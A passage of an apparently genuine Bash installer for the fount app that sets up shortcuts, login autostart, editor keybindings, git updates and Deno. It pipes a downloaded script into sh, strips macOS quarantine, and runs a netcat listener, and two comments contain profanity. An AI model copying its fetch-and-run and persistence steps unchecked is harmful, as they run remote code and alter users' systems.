	target_path=$(get_init_force_target_path "$target_user" "$target_home")
	paths=("$FOUNT_DIR")
	while IFS= read -r path; do
		[ -n "$path" ] && deno_dirs+=("$path")
	done < <(get_deno_dirs_for_init_force "$target_user" "$target_home")
	paths+=("${deno_dirs[@]}")
	for path in "${paths[@]}"; do
		fix_init_force_tree_permissions "$path"
	done
	chmod +x "$FOUNT_DIR/path/fount" "$SCRIPT_DIR/fount.sh" 2>/dev/null || true
	find "$FOUNT_DIR/path" -type f -exec chmod +x {} + 2>/dev/null || true
	init_exit=0
	sudo -u "$target_user" env HOME="$target_home" PATH="$target_path" "$0" init || init_exit=$?
	for path in "${paths[@]}"; do
		stop_locking_process_for_path "$path"
		restore_init_force_tree_ownership "$target_user" "$target_home" "$path" "$FOUNT_DIR"
	done
	return "$init_exit"
}

open_url_in_browser() {
	local url="$1"
	if [ "$OS_TYPE" = "Linux" ]; then
		xdg-open "$url" >/dev/null 2>&1 &
	elif [ "$OS_TYPE" = "Darwin" ]; then
		open "$url" >/dev/null 2>&1 &
	fi
}

install_ipc_tools() {
	install_package "nc" "netcat gnu-netcat openbsd-netcat netcat-openbsd nmap-ncat" || install_package "socat" "socat"
}

invoke_git_for_fount() {
	GIT_TERMINAL_PROMPT=0 GIT_OPTIONAL_LOCKS=0 git -C "$FOUNT_DIR" "$@"
}

fount_git_ref_exists() {
	invoke_git_for_fount rev-parse --verify "$1" &>/dev/null
}

fount_git_backup_uncommitted() {
	command -v git &>/dev/null || return 0
	[ -d "$FOUNT_DIR/.git" ] || return 0
	if [ -z "$(invoke_git_for_fount status --porcelain)" ]; then
		return 0
	fi

	local timestamp
	timestamp=$(date +'%Y%m%d_%H%M%S')
	local tmp_base="${TMPDIR:-/tmp}"
	local diff_file_path="$tmp_base/fount-local-changes-diff_$timestamp.diff"

	invoke_git_for_fount add -A || return 1
	if ! invoke_git_for_fount diff --cached >"$diff_file_path"; then
		return 1
	fi
	if fount_git_ref_exists HEAD; then
		invoke_git_for_fount reset HEAD || return 1
	else
		invoke_git_for_fount reset || return 1
	fi

	print_i18n_yellow 'git.localChangesDetected'
	print_i18n_green 'git.backupSavedTo' 'path' "$diff_file_path"
}

fount_git_sync_to_ref() {
	local ref="$1"
	if ! fount_git_ref_exists "$ref"; then
		print_i18n_yellow 'git.remoteRefUnavailable' 'ref' "$ref" >&2
		return 1
	fi
	fount_git_backup_uncommitted || return 1
	invoke_git_for_fount clean -fd || return 1
	invoke_git_for_fount reset --hard "$ref"
}

git_reset_and_clean() {
	command -v git &>/dev/null || return 0
	invoke_git_for_fount config core.autocrlf false
	local has_head=0 fetch_ok=0
	if fount_git_ref_exists HEAD; then has_head=1; fi
	if invoke_git_for_fount fetch origin; then fetch_ok=1; fi
	if ! fount_git_ref_exists origin/master; then
		if [ "$fetch_ok" -eq 0 ]; then
			print_i18n_yellow 'git.fetchFailed' >&2
			print_i18n_yellow 'git.fetchFailedSkippingUpdate' >&2
		fi
		return 1
	fi
	if [ "$has_head" -eq 0 ] && [ "$fetch_ok" -eq 0 ]; then
		print_i18n_yellow 'git.fetchFailed' >&2
		print_i18n_yellow 'git.fetchFailedSkippingUpdate' >&2
		return 1
	fi
	if [ "$fetch_ok" -eq 0 ]; then
		print_i18n_yellow 'git.fetchFailed' >&2
		print_i18n_yellow 'git.fetchFailedSkippingUpdate' >&2
		return 1
	fi
	if fount_git_sync_to_ref origin/master; then
		invoke_git_for_fount gc --aggressive --prune=now --force
	fi
}

handle_auto_reinitialization() {
	if [ -f "$FOUNT_DIR/.noautoinit" ]; then
		print_i18n_yellow 'keepalive.autoInitDisabled' >&2
		exit 1
	fi
	print_i18n_yellow 'keepalive.restartingTooFast' >&2
	restart_timestamps=()

	if ! ("$0" init); then
		print_i18n_red 'keepalive.initFailed' >&2
		exit 1
	fi
	init_attempted=1
	get_i18n 'keepalive.initComplete'
}

get_profile_files() {
	printf "%s\\n" "$HOME/.profile" "$HOME/.bashrc" "$HOME/.zshrc" "$HOME/.bash_profile"
}

# 函数: 创建桌面快捷方式
create_desktop_shortcut() {
	local icon_path="$FOUNT_DIR/src/public/pages/favicon.ico"

	if [ "$OS_TYPE" = "Linux" ]; then
		install_package "xdg-open" "xdg-utils" || return 1

		local desktop_file_path="$HOME/.local/share/applications/fount.desktop"
		mkdir -p "$(dirname "$desktop_file_path")"
		cat <<EOF >"$desktop_file_path"
[Desktop Entry]
Version=1.0
Type=Application
Name=fount
Comment=fount Application
Exec="$FOUNT_DIR/path/fount" open
Icon="$icon_path"
Terminal=true
Categories=Utility;
EOF
		chmod +x "$desktop_file_path"
		get_i18n 'shortcut.desktopShortcutCreated' 'path' "$desktop_file_path"

		local protocol_desktop_file_path="$HOME/.local/share/applications/fount-protocol.desktop"
		mkdir -p "$(dirname "$protocol_desktop_file_path")"
		cat <<EOF >"$protocol_desktop_file_path"
[Desktop Entry]
Version=1.0
Type=Application
Name=fount Protocol Handler
Comment=Handles fount:// protocol links
Exec="$FOUNT_DIR/path/fount" protocolhandle %u
Terminal=false
NoDisplay=true
MimeType=x-scheme-handler/fount;
Categories=Utility;
EOF
		chmod +x "$protocol_desktop_file_path"
		xdg-mime default fount-protocol.desktop x-scheme-handler/fount 2>/dev/null || true
		if command -v update-desktop-database &>/dev/null; then
			update-desktop-database "$HOME/.local/share/applications"
		fi
		get_i18n 'shortcut.protocolHandlerRegistered'

	elif [ "$OS_TYPE" = "Darwin" ]; then
		local app_path="$HOME/Desktop/fount.app"
		rm -rf "$app_path" # Clean up old version first

		mkdir -p "$app_path/Contents/MacOS" "$app_path/Contents/Resources"
		local icns_path="$FOUNT_DIR/src/public/pages/favicon.icns"
		local icon_name="favicon.icns"
		if [ ! -f "$icns_path" ] && command -v sips &>/dev/null; then
			sips -s format icns "$icon_path" --out "$icns_path"
		fi
		if [ -f "$icns_path" ]; then
			cp "$icns_path" "$app_path/Contents/Resources/favicon.icns"
		else
			cp "$icon_path" "$app_path/Contents/Resources/favicon.ico"
			icon_name="favicon.ico"
		fi
		rm -f "$icns_path"

		cat <<EOF >"$app_path/Contents/Info.plist"
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>CFBundleDevelopmentRegion</key>
	<string>en</string>
	<key>CFBundleExecutable</key>
	<string>fount-launcher</string>
	<key>CFBundleIconFile</key>
	<string>$icon_name</string>
	<key>CFBundleIdentifier</key>
	<string>com.steve02081504.fount</string>
	<key>CFBundleInfoDictionaryVersion</key>
	<string>6.0</string>
	<key>CFBundleName</key>
	<string>fount</string>
	<key>CFBundlePackageType</key>
	<string>APPL</string>
	<key>CFBundleShortVersionString</key>
	<string>1.0</string>
	<key>CFBundleSignature</key>
	<string>????</string>
	<key>CFBundleVersion</key>
	<string>1</string>
	<key>LSMinimumSystemVersion</key>
	<string>10.15</string>
	<key>NSPrincipalClass</key>
	<string>NSApplication</string>
	<key>LSUIElement</key>
	<false/>
	<key>CFBundleURLTypes</key>
	<array>
		<dict>
			<key>CFBundleURLName</key>
			<string>fount Protocol</string>
			<key>CFBundleURLSchemes</key>
			<array>
				<string>fount</string>
			</array>
		</dict>
	</array>
</dict>
</plist>
EOF

		local temp_applescript_file="/tmp/fount_launcher_script.applescript"
		cat <<EOF >"$temp_applescript_file"
on run argv
	set fount_command_path to "$FOUNT_DIR/path/fount"
	set command_to_execute to quoted form of fount_command_path
	if (count of argv) is 0 then
		set command_to_execute to command_to_execute & " open"
	else
		repeat with i from 1 to count of argv
			set command_to_execute to command_to_execute & " " & quoted form of (item i of argv)
		end repeat
	end if

	set final_command_in_terminal to ":; (" & command_to_execute & "; echo; echo \"fount has exited. Press Enter to close this window...\"; read -r)"

	tell application "Terminal"
		activate
		do script final_command_in_terminal
	end tell
end run
EOF
		local compiled_applescript="$app_path/Contents/Resources/fount-launcher.scpt"
		if command -v osacompile &>/dev/null; then
			osacompile -o "$compiled_applescript" "$temp_applescript_file"
		else
			print_i18n_red 'shortcut.osacompileNotFound' >&2
			return 1
		fi

		local launcher_script="$app_path/Contents/MacOS/fount-launcher"
		cat <<EOF >"$launcher_script"
#!/usr/bin/env bash
SCRIPT_DIR="\$(dirname "\$0")"
osascript "\$SCRIPT_DIR/../Resources/fount-launcher.scpt" "\$@"
EOF
		chmod -R u+rwx "$app_path"
		xattr -dr com.apple.quarantine "$app_path"

		local LSREGISTER_PATH="/System/Library/Frameworks/CoreServices.framework/Versions/A/Frameworks/LaunchServices.framework/Versions/A/Support/lsregister"
		if [ -f "$LSREGISTER_PATH" ]; then
			if ! "$LSREGISTER_PATH" -f "$app_path"; then
				print_i18n_yellow 'shortcut.lsregisterFailed' >&2
				# 操你妈，跟你爆了
				killall lsd
			fi
		else
			# 操你妈，跟你爆了
			killall lsd
		fi

		if [ -d "$app_path" ]; then
			get_i18n 'shortcut.desktopShortcutCreated' 'path' "$app_path"
		else
			print_i18n_red 'shortcut.createDesktopAppFailed' >&2
			return 1
		fi
	else
		print_i18n_yellow 'shortcut.shortcutNotSupported' 'os' "$OS_TYPE"
	fi
	return 0
}

# 登录后后台启动（无终端）：Linux autostart / macOS LaunchAgent
register_boot_background() {
	if [ "$IN_DOCKER" -eq 1 ] || [ "$IN_TERMUX" -eq 1 ]; then
		return 0
	fi
	if [ -f "$FOUNT_DIR/.noautoboot" ]; then
		return 0
	fi
	local launcher="$FOUNT_DIR/path/fount"
	case "$OS_TYPE" in
	Linux)
		mkdir -p "$HOME/.config/autostart"
		local desk="$HOME/.config/autostart/fount-background.desktop"
		{
			echo '[Desktop Entry]'
			echo 'Version=1.0'
			echo 'Type=Application'
			echo 'Name=fount background'
			echo 'Comment=fount background keepalive at login'
			printf 'Exec=/bin/bash -l -c "exec '\''%s'\'' background keepalive"\n' "$launcher"
			echo 'Terminal=false'
			echo 'Categories=Utility;'
			echo 'X-GNOME-Autostart-enabled=true'
		} >"$desk"
		chmod +x "$desk"
		;;
	Darwin)
		local plist="$HOME/Library/LaunchAgents/com.steve02081504.fount.background.plist"
		mkdir -p "$HOME/Library/LaunchAgents"
		local shell_cmd shell_cmd_esc
		shell_cmd=$(printf "exec '%s' background keepalive" "$launcher")
		shell_cmd_esc=$(printf '%s' "$shell_cmd" | sed -e 's/&/\&amp;/g' -e 's/</\&lt;/g' -e 's/>/\&gt;/g')
		launchctl bootout "gui/$(id -u)" "$plist" 2>/dev/null || true
		cat >"$plist" <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>Label</key>
	<string>com.steve02081504.fount.background</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/bash</string>
		<string>-l</string>
		<string>-c</string>
		<string>$shell_cmd_esc</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>
EOF
		launchctl bootstrap "gui/$(id -u)" "$plist" 2>/dev/null || true
		;;
	esac
}

remove_boot_background() {
	case "$OS_TYPE" in
	Linux)
		rm -f "$HOME/.config/autostart/fount-background.desktop"
		;;
	Darwin)
		local plist="$HOME/Library/LaunchAgents/com.steve02081504.fount.background.plist"
		if [ -f "$plist" ]; then
			launchctl bootout "gui/$(id -u)" "$plist" 2>/dev/null || true
			rm -f "$plist"
		fi
		;;
	esac
}

# REPL 所需终端按键：Shift+Enter 重映射为 CSI-u（IDE 集成终端）。
get_fount_terminal_keybindings_manifest_path() {
	echo "$FOUNT_DIR/data/installer/terminal_keybindings.json"
}

get_fount_editor_keybindings_paths() {
	local editor user_dir
	for editor in Cursor Code VSCodium; do
		case "$OS_TYPE" in
		Darwin) user_dir="$HOME/Library/Application Support/$editor/User" ;;
		Linux) user_dir="$HOME/.config/$editor/User" ;;
		*) return 0 ;;
		esac
		[ -d "$user_dir" ] && echo "$user_dir/keybindings.json"
	done
}

merge_fount_editor_keybindings() {
	local keybindings_path="$1"
	command -v jq &>/dev/null || return 1
	local parent patch merged entries before
	parent=$(dirname "$keybindings_path")
	mkdir -p "$parent"
	patch='{"key":"shift+enter","command":"workbench.action.terminal.sendSequence","args":{"text":"\u001b[13;2u"},"when":"terminalFocus","isfountPatch":true}'
	before='[]'
	if [ -f "$keybindings_path" ]; then
		before=$(jq -c '
			if type == "array" then .
			elif .keybindings? then .keybindings
			else [] end
		' "$keybindings_path" 2>/dev/null) || before='[]'
	fi
	entries=$(echo "$before" | jq -c --argjson patch "$patch" '
		map(select(.isfountPatch != true)) + [$patch]
	')
	merged=$(echo "$entries" | jq '.')
	[ "$before" = "$(echo "$entries" | jq -c '.')" ] && return 1
	echo "$merged" >"$keybindings_path"
	return 0
}

split_fount_editor_keybindings() {
	local keybindings_path="$1"
	[ -f "$keybindings_path" ] || return 0
	command -v jq &>/dev/null || return 1
	local filtered
	filtered=$(jq -c 'map(select(.isfountPatch != true))' "$keybindings_path" 2>/dev/null) || return 1
	if [ "$filtered" = "[]" ]; then
		rm -f "$keybindings_path"
	else
		echo "$filtered" | jq '.' >"$keybindings_path"
	fi
	return 0
}

register_terminal_keybindings() {
	if [ "$OS_TYPE" != "Linux" ] && [ "$OS_TYPE" != "Darwin" ]; then return 0; fi
	command -v jq &>/dev/null || return 0
	mkdir -p "$INSTALLER_DATA_DIR"
	local manifest kb_path patched=false
	manifest=$(get_fount_terminal_keybindings_manifest_path)
	local editor_paths=()
	while IFS= read -r kb_path; do
		[ -n "$kb_path" ] || continue
		if merge_fount_editor_keybindings "$kb_path"; then
			editor_paths+=("$kb_path")
			patched=true
		fi
	done < <(get_fount_editor_keybindings_paths)
	if ! $patched; then return 0; fi
	printf '%s\n' "${editor_paths[@]}" | jq -R . | jq -s '{editorKeybindings: ., windowsTerminalSettings: []}' >"$manifest"
	get_i18n 'terminalKeybindings.registered'
}

unregister_terminal_keybindings() {
	if [ "$OS_TYPE" != "Linux" ] && [ "$OS_TYPE" != "Darwin" ]; then return 0; fi
	command -v jq &>/dev/null || return 0
	local manifest kb_path
	manifest=$(get_fount_terminal_keybindings_manifest_path)
	local kb_paths=()
	if [ -f "$manifest" ]; then
		while IFS= read -r kb_path; do
			[ -n "$kb_path" ] && kb_paths+=("$kb_path")
		done < <(jq -r '.editorKeybindings[]? // empty' "$manifest" 2>/dev/null)
	fi
	while IFS= read -r kb_path; do
		[ -n "$kb_path" ] || continue
		local found=false
		for existing in "${kb_paths[@]}"; do
			[ "$existing" = "$kb_path" ] && found=true && break
		done
		$found || kb_paths+=("$kb_path")
	done < <(get_fount_editor_keybindings_paths)
	for kb_path in "${kb_paths[@]}"; do
		if split_fount_editor_keybindings "$kb_path"; then
			get_i18n 'terminalKeybindings.editorRemoved' 'path' "$kb_path"
		fi
	done
	rm -f "$manifest"
}

# 函数: 移除桌面快捷方式
remove_desktop_shortcut() {
	get_i18n 'remove.removingDesktopShortcut'
	if [ "$OS_TYPE" = "Linux" ]; then
		rm -f "$HOME/.local/share/applications/fount.desktop" "$HOME/.local/share/applications/fount-protocol.desktop"
		if command -v update-desktop-database &>/dev/null; then
			update-desktop-database "$HOME/.local/share/applications"
		fi
		get_i18n 'remove.desktopShortcutRemoved'
	elif [ "$OS_TYPE" = "Darwin" ]; then
		rm -rf "$HOME/Desktop/fount.app"
		get_i18n 'remove.desktopShortcutRemoved'
	fi
}

# 函数: 将 fount 路径添加到 PATH
ensure_fount_path() {
	if [[ ":$PATH:" != *":$FOUNT_DIR/path:"* ]]; then
		if [ ! -f "$HOME/.profile" ]; then
			touch "$HOME/.profile"
		fi
		for profile_file in $(get_profile_files); do
			if [ -f "$profile_file" ] && ! grep -q "export PATH=.*$FOUNT_DIR/path" "$profile_file"; then
				if [ "$(tail -c 1 "$profile_file")" != $'\n' ]; then echo >>"$profile_file"; fi
				echo "export PATH=\"\$PATH:$FOUNT_DIR/path\"" >>"$profile_file"
			fi
		done
		export PATH="$PATH:$FOUNT_DIR/path"
	fi
}
ensure_fount_path

# 函数: 确保核心依赖可用
ensure_dependencies() {
	case "$1" in
	nop) return 0 ;;
	open | protocolhandle)
		test_browser
		install_package "nc" "netcat gnu-netcat openbsd-netcat netcat-openbsd nmap-ncat" || install_package "socat" "socat"
		install_package "jq" "jq"
		if [[ "$OS_TYPE" == "Linux" ]]; then install_package "xdg-open" "xdg-utils"; fi
		;;
	upgrade)
		install_package "git" "git"
		;;
	deno_install)
		install_package "curl" "curl"
		;;
	deno_install_fallback)
		install_package "unzip" "unzip"
		;;
	*) return 1 ;;
	esac
	return $?
}

# 提取 'open' 和 'protocolhandle' 的后台任务脚本
read -r -d '' BACKGROUND_IPC_JOB <<'EOF'
fount_ipc_internal() {
	local type="$1" data="$2" hostname="${3:-localhost}" port="${4:-16698}"
	local cmd_json="{\"type\":\"$type\",\"data\":$data}" response=""
	if command -v nc &>/dev/null; then
		response=$(echo "$cmd_json" | nc -w 3 "$hostname" "$port" 2>/dev/null)
	elif command -v socat &>/dev/null; then
		response=$(echo "$cmd_json" | socat -T 3 - TCP:"$hostname":"$port",nodelay 2>/dev/null)
	fi
	if [ -z "$response" ]; then return 1; fi
	local status=$(echo "$response" | jq -r '.status // empty')
	if [ "$status" = "ok" ]; then return 0; else return 1; fi
}
test_fount_running_internal() { fount_ipc_internal "ping" "{}"; }

timeout=60 elapsed=0
while ! test_fount_running_internal; do
	sleep 1; elapsed=$((elapsed + 1))
	if [ "$elapsed" -ge "$timeout" ]; then
		echo "Error: fount server did not start in time." >&2; exit 1
	fi
done
os_type=$(uname -s)
if [ "$os_type" = "Linux" ]; then
	xdg-open "$TARGET_URL" >/dev/null 2>&1
elif [ "$os_type" = "Darwin" ]; then
	open "$TARGET_URL" >/dev/null 2>&1
fi
EOF

# 参数处理: open, background, protocolhandle
if [[ $# -gt 0 ]]; then
	case "$1" in
	nop)
		exit 0
		;;
	open)
		handle_docker_termux_passthrough "$@"
		# 若 $FOUNT_DIR/data 是目录
		if [ -d "$FOUNT_DIR/data" ]; then
			ensure_dependencies "open" || exit 1
			TARGET_URL='https://steve02081504.github.io/fount/wait?cold_bootting=true'
			open_url_in_browser "$TARGET_URL"
			"$0" "${@:2}"
			exit $?
		else
			install_ipc_tools
			trap '[[ -n "$STATUS_SERVER_PID" ]] && kill "$STATUS_SERVER_PID" 2>/dev/null' EXIT
			if command -v nc &>/dev/null; then
				while true; do {
					while IFS= read -r -t 2 line && [[ "$line" != $'\r' ]]; do :; done
					echo -e "HTTP/1.1 200 OK\r\nAccess-Control-Allow-Origin: *\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"message\":\"pong\"}"
				} | nc -l 8930 -q 0; done >/dev/null 2>&1 &
				STATUS_SERVER_PID=$!
			elif command -v socat &>/dev/null; then
				(socat -T 5 TCP-LISTEN:8930,reuseaddr,fork SYSTEM:"read; echo -e 'HTTP/1.1 200 OK\r\nAccess-Control-Allow-Origin: *\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"message\":\"pong\"}'") >/dev/null 2>&1 &
				STATUS_SERVER_PID=$!
			fi

			if [[ -n "$STATUS_SERVER_PID" ]]; then
				URL='https://steve02081504.github.io/fount/wait/install'
				open_url_in_browser "$URL"
			else
				echo -e "${C_YELLOW}Warning: Could not start status server. Proceeding with standard installation.${C_RESET}"
			fi
			"$0" "${@:2}"
			exit $?
		fi
		;;
	background)
		export FOUNT_BACKGROUND=1
		handle_docker_termux_passthrough "$@"
		if [ -f "$FOUNT_DIR/.nobackground" ]; then
			if command -v xterm &>/dev/null; then
				xterm -e "$0" "${@:2}" &
			elif command -v gnome-terminal &>/dev/null; then
				gnome-terminal -- "$0" "${@:2}"
			elif command -v terminator &>/dev/null; then
				terminator -- "$0" "${@:2}"
			elif command -v konsole &>/dev/null; then
				konsole -- "$0" "${@:2}"
			elif command -v xfce4-terminal &>/dev/null; then
				xfce4-terminal -- "$0" "${@:2}"
			elif command -v lxterminal &>/dev/null; then
				lxterminal -- "$0" "${@:2}"
			else
				echo -e "${C_RED}Error: No terminal emulator found.${C_RESET}" >&2
				nohup "$0" "${@:2}" >/dev/null 2>&1 &
			fi
		else
			nohup "$0" "${@:2}" >/dev/null 2>&1 &
		fi
		unset FOUNT_BACKGROUND
		exit 0
		;;
	protocolhandle)
		handle_docker_termux_passthrough "$@"
		protocolUrl="$2"
		if [[ "$protocolUrl" == "fount://nop/" ]]; then
			"$0" "${@:3}"
			exit $?
		fi
		if [ -z "$protocolUrl" ]; then
			echo -e "${C_RED}Error: No URL provided for protocolhandle.${C_RESET}" >&2
			exit 1
		fi
		ensure_dependencies "protocolhandle" || exit 1
		TARGET_URL="https://steve02081504.github.io/fount/protocol/?url=$(urlencode "$protocolUrl")"
		export TARGET_URL
		nohup bash -c "$BACKGROUND_IPC_JOB" >/dev/null 2>&1 &
		"$0" "${@:3}"
		exit $?
		;;
	esac
fi

# 函数: 升级 fount
fount_upgrade() {
	ensure_dependencies "upgrade" || return 0
	if git config --global --get-all safe.directory | grep -q -xF "$FOUNT_DIR"; then : else
		git config --global --add safe.directory "$FOUNT_DIR"
	fi
	if [ ! -d "$FOUNT_DIR/.git" ]; then
		get_i18n 'git.repoNotFound'
		invoke_git_for_fount init -b master
		invoke_git_for_fount config core.autocrlf false
		invoke_git_for_fount remote add origin https://github.com/steve02081504/fount.git || true
		get_i18n 'git.fetchingAndResetting'
		if ! invoke_git_for_fount fetch origin master --depth 1; then
			print_i18n_yellow 'git.fetchFailed' >&2
			print_i18n_yellow 'git.fetchFailedSkippingUpdate' >&2
			return 1
		fi
		fount_git_sync_to_ref origin/master || return 1
		return 0
	fi

	invoke_git_for_fount config core.autocrlf false
	local has_head=0
	if fount_git_ref_exists HEAD; then has_head=1; fi
	if ! invoke_git_for_fount fetch origin; then
		print_i18n_yellow 'git.fetchFailed' >&2
		print_i18n_yellow 'git.fetchFailedSkippingUpdate' >&2
		return 1
	fi
	if [ "$has_head" -eq 0 ] && ! fount_git_ref_exists HEAD; then
		print_i18n_yellow 'git.fetchFailedSkippingUpdate' >&2
		return 1
	fi

	local currentBranch
	currentBranch=$(invoke_git_for_fount rev-parse --abbrev-ref HEAD 2>/dev/null) || currentBranch=HEAD
	if [ "$currentBranch" = "HEAD" ]; then
		if ! fount_git_ref_exists origin/master; then
			print_i18n_yellow 'git.remoteRefUnavailable' 'ref' 'origin/master' >&2
			return 1
		fi
		get_i18n 'git.notOnBranch'
		fount_git_sync_to_ref origin/master || return 1
		invoke_git_for_fount checkout master
		currentBranch=$(invoke_git_for_fount rev-parse --abbrev-ref HEAD)
	fi

	if ! fount_git_ref_exists HEAD; then
		print_i18n_yellow 'git.fetchFailedSkippingUpdate' >&2
		return 1
	fi

	local remoteBranch
	remoteBranch=$(invoke_git_for_fount rev-parse --abbrev-ref --symbolic-full-name '@{u}' 2>/dev/null)
	if [ -z "$remoteBranch" ]; then
		if ! fount_git_ref_exists origin/master; then
			print_i18n_yellow 'git.remoteRefUnavailable' 'ref' 'origin/master' >&2
			return 1
		fi
		print_i18n_yellow 'git.noUpstreamBranch' 'branch' "$currentBranch" >&2
		invoke_git_for_fount branch --set-upstream-to origin/master "$currentBranch"
		remoteBranch="origin/master"
	fi
	if ! fount_git_ref_exists "$remoteBranch"; then
		print_i18n_yellow 'git.remoteRefUnavailable' 'ref' "$remoteBranch" >&2
		return 1
	fi

	local git_status
	git_status=$(invoke_git_for_fount status --porcelain)
	local mergeBase localCommit remoteCommit
	mergeBase=$(invoke_git_for_fount merge-base "$currentBranch" "$remoteBranch" 2>/dev/null) || return 1
	localCommit=$(invoke_git_for_fount rev-parse "$currentBranch" 2>/dev/null) || return 1
	remoteCommit=$(invoke_git_for_fount rev-parse "$remoteBranch" 2>/dev/null) || return 1
	if [ "$localCommit" != "$remoteCommit" ]; then
		if [ "$mergeBase" = "$localCommit" ]; then
			get_i18n 'git.updatingFromRemote'
			if [ -n "$git_status" ]; then
				fount_git_backup_uncommitted || return 1
			fi
			invoke_git_for_fount reset --hard "$remoteBranch"
		elif [ "$mergeBase" = "$remoteCommit" ]; then
			get_i18n 'git.localBranchAhead'
			if [ -n "$git_status" ]; then
				print_i18n_yellow 'git.dirtyWorkingDirectory' >&2
			fi
		else
			get_i18n 'git.branchesDiverged'
			if [ -n "$git_status" ]; then
				fount_git_backup_uncommitted || return 1
			fi
			invoke_git_for_fount reset --hard "$remoteBranch"
		fi
	else
		get_i18n 'git.alreadyUpToDate'
		if [ -n "$git_status" ]; then
			print_i18n_yellow 'git.dirtyWorkingDirectory' >&2
		fi
	fi
}

# 函数: 安装 Deno
install_deno() {
	if command -v deno &>/dev/null || [[ $IN_TERMUX -eq 1 && -f ~/.deno/bin/deno.glibc.sh ]]; then return 0; fi
	if [[ -z "$(command -v deno)" && -f "$HOME/.deno/env" ]]; then
		# shellcheck source=/dev/null
		. "$HOME/.deno/env"
	fi
	if command -v deno &>/dev/null || [[ $IN_TERMUX -eq 1 && -f ~/.deno/bin/deno.glibc.sh ]]; then return 0; fi

	# 首先尝试使用包管理器安装
	if install_package "deno" "deno"; then
		return 0
	fi

	# 包管理器安装失败，回退到官方脚本
	ensure_dependencies "deno_install" || exit 1
	if [[ $IN_TERMUX -eq 1 ]]; then
		get_i18n 'deno.installingTermux'
		set -e
		if ! command -v patchelf &>/dev/null; then
			add_package_to_tracker "patchelf" "INSTALLED_SYSTEM_PACKAGES_ARRAY"
		fi
		if ! command -v which &>/dev/null; then
			add_package_to_tracker "which" "INSTALLED_SYSTEM_PACKAGES_ARRAY"
		fi
		if ! command -v time &>/dev/null; then
			add_package_to_tracker "time" "INSTALLED_SYSTEM_PACKAGES_ARRAY"
		fi
		if ! command -v ldd &>/dev/null; then
			add_package_to_tracker "ldd" "INSTALLED_SYSTEM_PACKAGES_ARRAY"
		fi
		if ! command -v tree &>/dev/null; then
			add_package_to_tracker "tree" "INSTALLED_SYSTEM_PACKAGES_ARRAY"
		fi
		if ! command -v pacman &>/dev/null; then
			add_package_to_tracker "pacman" "INSTALLED_SYSTEM_PACKAGES_ARRAY"
		fi
		yes y | pkg upgrade -y
		pkg install -y pacman patchelf which time ldd tree
		pacman-key --init && pacman-key --populate && pacman -Syu --noconfirm
		pacman -Sy glibc-runner --assume-installed bash,patchelf,resolv-conf --noconfirm
		add_package_to_tracker "glibc-runner" "INSTALLED_PACMAN_PACKAGES_ARRAY"
		set +e
		curl -fsSL https://deno.land/install.sh | sh -s -- -y
		export PATH="$HOME/.deno/bin:$PATH"
		hash -r
		patch_deno
		touch "$AUTO_INSTALLED_DENO_FLAG"
	else
		get_i18n 'deno.missing'
		if ! curl -fsSL https://deno.land/install.sh | sh -s -- -y; then
			get_i18n 'deno.installFailedFallback'
			ensure_dependencies "deno_install_fallback" || exit 1
			local deno_dl_url
			deno_dl_url="https://github.com/denoland/deno/releases/latest/download/deno-"
			local arch_target
			local current_arch
			current_arch=$(uname -m)
			case "$OS_TYPE" in
			Linux*) [[ "$current_arch" = "aarch64" ]] && arch_target="aarch64-unknown-linux-gnu.zip" || arch_target="x86_64-unknown-linux-gnu.zip" ;;
			Darwin*) [[ "$current_arch" = "arm64" ]] && arch_target="aarch64-apple-darwin.zip" || arch_target="x86_64-apple-darwin.zip" ;;
			*) arch_target="x86_64-unknown-linux-gnu.zip" ;;
			esac
			mkdir -p "$FOUNT_DIR/path"
			if curl -fL -o "/tmp/deno.zip" "${deno_dl_url}${arch_target}" && unzip -o "/tmp/deno.zip" -d "$FOUNT_DIR/path"; then
				rm "/tmp/deno.zip"
				chmod +x "$FOUNT_DIR/path/deno"
				export PATH="$PATH:$FOUNT_DIR/path"
		else
			print_i18n_red 'deno.isRequired' >&2
				exit 1
			fi
		fi
		# shellcheck source=/dev/null
		[ -f "$HOME/.deno/env" ] && . "$HOME/.deno/env"
		export PATH="$PATH:$HOME/.deno/bin"
		touch "$AUTO_INSTALLED_DENO_FLAG"
	fi
	if ! command -v deno &>/dev/null; then
		print_i18n_red 'deno.isRequired' >&2
		exit 1
	fi
}
install_deno

# 函数: 升级 Deno
base_deno_upgrade() {
	local deno_version_before
	deno_version_before=$(run_deno -V 2>&1)
	if [[ -z "$deno_version_before" ]]; then
		print_i18n_red 'deno.notWorking' >&2
		return 1
	fi

	# 首先尝试使用包管理器更新
	if upgrade_package "deno" "deno"; then
		return 0
	fi

	# 包管理器更新失败，回退到官方升级命令
	local deno_upgrade_channel="stable"
	if [[ "$deno_version_before" == *"+"* ]]; then
		deno_upgrade_channel="canary"
	elif [[ "$deno_version_before" == *"-rc"* ]]; then
		deno_upgrade_channel="rc"
	fi

	local errorOut deno_upgrade_exit_code
	errorOut=$(deno upgrade -q "$deno_upgrade_channel" 2> >(tee /dev/stderr))
	deno_upgrade_exit_code=$?
	if [[ $errorOut == *"USAGE"* || $errorOut == *"unexpected argument"* ]]; then
		run_deno upgrade -q
		deno_upgrade_exit_code=$?
	fi
	if [[ $deno_upgrade_exit_code -ne 0 ]]; then
		if [[ $IN_TERMUX -eq 1 ]]; then
			get_i18n 'deno.upgradeFailedTermux'
			rm -rf "$HOME/.deno"
			install_deno
			return $?
		else
			print_i18n_yellow 'deno.upgradeFailed' >&2
			return 1
		fi
	fi
}
deno_upgrade() {
	local upgraded_flag="$FOUNT_DIR/data/installer/deno_upgraded"
	if [ -f "$upgraded_flag" ]; then
		( base_deno_upgrade ) &
		return
	fi
	if ! base_deno_upgrade; then
		return
	else
		mkdir -p "$(dirname "$upgraded_flag")"
		touch "$upgraded_flag"
	fi
}

update_fount_and_deno() {
	if [ -f "$FOUNT_DIR/.noupdate" ]; then
		get_i18n 'update.skippingFountUpdate'
	else
		fount_upgrade
